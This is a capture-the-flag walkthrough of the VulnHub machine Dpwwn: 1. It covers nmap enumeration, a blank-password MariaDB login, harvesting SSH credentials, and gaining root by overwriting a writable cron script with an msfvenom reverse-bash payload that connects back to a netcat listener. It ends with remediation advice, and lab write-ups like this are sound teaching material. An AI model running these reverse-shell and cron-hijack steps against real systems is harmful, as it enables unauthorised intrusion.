# Dpwwn: 1 (VulnHub)

## Overview

**Dpwwn: 1** is an Easy-level VulnHub machine created by **Debashis Pal**. The machine focuses on service enumeration, database exploitation, credential discovery, SSH authentication, and privilege escalation through a misconfigured cron job.

The challenge demonstrates how an exposed MariaDB service, weak database authentication, plaintext credential storage, and an insecure cron configuration can be chained together to achieve complete system compromise.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Dpwwn: 1 |
| Author | Debashis Pal |
| Series | Dpwwn |
| Platform | VulnHub |
| Release Date | 4 August 2019 |
| Difficulty | Easy |
| Target OS | CentOS Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access and Retrieve the Final Flag |

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- MariaDB Enumeration
- Database Enumeration
- Credential Harvesting
- SSH Authentication
- Linux Enumeration
- Cron Job Enumeration
- Msfvenom Payload Generation
- Reverse Shell
- Privilege Escalation
- Post Exploitation

## Tools Used

- Netdiscover
- Nmap
- MariaDB Client
- SSH
- Msfvenom
- Netcat
- Linux Shell Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Analyze the web application.
4. Enumerate the exposed MariaDB service.
5. Discover stored SSH credentials.
6. Authenticate via SSH.
7. Enumerate local files.
8. Identify a writable cron job script.
9. Replace the script with a reverse shell payload.
10. Wait for cron execution.
11. Obtain a root shell.
12. Retrieve the final flag.

## Network Discovery

Identify active hosts:

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.32
```

The target machine was successfully identified on the local network.

## Open Services Identified

Perform service enumeration:

```bash
sudo nmap -sC -sV -Pn 192.168.10.32 --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 7.4 |
| 80 | HTTP | Apache 2.4.6 (CentOS) |
| 3306 | MariaDB | MariaDB 5.5.60 |

The scan revealed an exposed SSH service, Apache web server, and publicly accessible MariaDB database.

## Website Enumeration

Browse to:

```text
http://192.168.10.32
```

The website displayed only the default Apache test page.

```text
Apache HTTP Server Test Page powered by CentOS
```

No useful information was discovered through the web application.

## MariaDB Enumeration

Attempt authentication using the default root account.

```bash
mysql -u root -p -h 192.168.10.32 --skip_ssl
```

Leave the password blank when prompted.

Authentication succeeded without a password.

## Database Enumeration

List available databases.

```sql
show databases;
```

Output:

```text
information_schema
mysql
performance_schema
ssh
```

Switch to the interesting database.

```sql
use ssh;
show tables;
```

Display user credentials.

```sql
select * from users;
```

Recovered credentials:

```text
Username: mistic
Password: testP@$$swordmistic
```

## Initial Access

Authenticate via SSH.

```bash
ssh mistic@192.168.10.32
```

Password:

```text
testP@$$swordmistic
```

Verify access.

```bash
whoami
```

Output:

```text
mistic
```

Initial shell access was successfully obtained.

## User Enumeration

List files in the user's home directory.

```bash
ls -la
```

Interesting file:

```text
logrot.sh
```

Read the script.

```bash
cat logrot.sh
```

The script appeared to be related to log rotation.

## Cron Job Enumeration

Inspect scheduled cron jobs.

```bash
cat /etc/crontab
```

Relevant entry:

```text
*/3 * * * * root /home/mistic/logrot.sh
```

The script:

- Executes every three minutes
- Runs as root
- Is writable by the low-privileged user

This creates a direct privilege escalation opportunity.

## Privilege Escalation

Generate a reverse shell payload.

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<attacker-ip> LPORT=1234 R
```

Replace the contents of the writable script.

```bash
echo 'bash -c "...reverse shell..."' > logrot.sh
```

Start a Netcat listener.

```bash
nc -lnvp 1234
```

After the cron job executes, a reverse shell connects back.

Verify privileges.

```bash
whoami
id
```

Output:

```text
root
uid=0(root)
```

Root access was successfully obtained.

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

Read the flag.

```bash
cat dpwwn-01-FLAG.txt
```

Output:

```text
Congratulation! I knew you can pwn it as this very easy challenge.

Thank you.
```

The encoded flag values were successfully retrieved from the flag file.

## Vulnerabilities Identified

### 1. Unauthenticated MariaDB Access

The MariaDB server allowed root authentication using a blank password.

### 2. Plaintext Credential Storage

SSH credentials were stored directly inside a database table.

### 3. Exposed Database Service

The database service was publicly accessible without proper restrictions.

### 4. Insecure Cron Job Configuration

A user-controlled script executed periodically with root privileges.

### 5. Writable Root-Owned Execution Path

The cron job executed a writable script, allowing arbitrary command execution as root.

## Attack Chain Summary

- Host Discovery using Netdiscover
- Service Enumeration using Nmap
- Website Enumeration
- MariaDB Enumeration
- Database Enumeration
- Credential Harvesting
- SSH Authentication
- User Enumeration
- Cron Job Enumeration
- Reverse Shell Payload Generation
- Root Shell via Cron Job Abuse
- Final Flag Retrieval

## Security Recommendations

- Disable remote root database access.
- Never allow blank database passwords.
- Store passwords securely using strong hashing algorithms.
- Restrict access to database services using firewall rules.
- Remove unnecessary services from public access.
- Prevent writable scripts from executing with elevated privileges.
- Regularly audit cron jobs for security risks.
- Apply the principle of least privilege.
- Monitor scheduled task modifications.
- Conduct regular penetration testing and vulnerability assessments.

## Key Learning Outcomes

- Database enumeration can expose valuable credentials.
- Default or blank passwords present severe security risks.
- Plaintext credential storage should never be used.
- Cron jobs frequently become privilege escalation vectors.
- Writable scripts executed by root should be avoided.
- Enumeration is the foundation of successful penetration testing.
- Multiple small misconfigurations can lead to complete system compromise.

## Flag

```text
Congratulation! I knew you can pwn it as this very easy challenge.

Thank you.
```

## Conclusion

Dpwwn: 1 is an excellent beginner-friendly VulnHub machine that teaches database enumeration, credential harvesting, SSH authentication, Linux enumeration, and privilege escalation through cron job abuse. The machine demonstrates how weak authentication, insecure credential storage, and improper privilege management can be chained together to obtain complete root compromise.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
